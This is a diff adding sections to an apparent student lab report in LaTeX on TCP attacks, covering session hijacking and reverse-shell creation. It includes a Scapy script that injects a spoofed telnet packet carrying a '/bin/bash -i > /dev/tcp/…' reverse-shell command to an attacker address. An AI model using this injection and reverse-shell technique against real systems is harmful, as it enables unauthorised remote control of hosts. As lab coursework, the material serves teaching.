@@ -61,5 +61,29 @@ send(pkt, verbose=0)
 This task is essentially the same as the task 2, but with the GUI response. I shouldn't and didn't encounter any issure for this task.
 
 \subsection{TCP Session Hijacking}
+To conduct this attack, you should detect the correct seq and ack number as same as the previous tasks. And remember to convert the plaint text into hexed text.\\
+Screenshot:
+\href{https://i.loli.net/2018/09/13/5b99bffc69cdc.png}{Convert},
+\href{https://i.loli.net/2018/09/13/5b99c04020f57.png}{Detection},
+\href{https://i.loli.net/2018/09/13/5b99c05fee0db.png}{Hijack}.
 
+\subsection{Creating Reverse Shell using TCP Session Hijacking}
+All the same except the data we attached. Using Scapy for convenience.
+Scapy:
+\begin{tlist}{2}
+  \item[]
+  \code{
+\#!/usr/bin/python3
+from scapy.all import *\\
+import binascii\\
+\vspace{12pt}\\
+ip = IP(src='192.168.137.2', dst='192.168.137.172')\\
+tcp = TCP(sport=41190, dport=23, flags="AP", seq=150966078, ack=333437326)\\
+data = '/bin/bash -i > /dev/tcp/192.168.137.205/9090 0<\&1 2>\&1\textbackslash{r}'\\
+pkt = ip/tcp/data\\
+ls(pkt)\\
+send(pkt,verbose=0)
+  }
+\end{tlist}
+\href{https://i.loli.net/2018/09/13/5b99d00b53a5b.png}{Attacker}.
 \end{document}
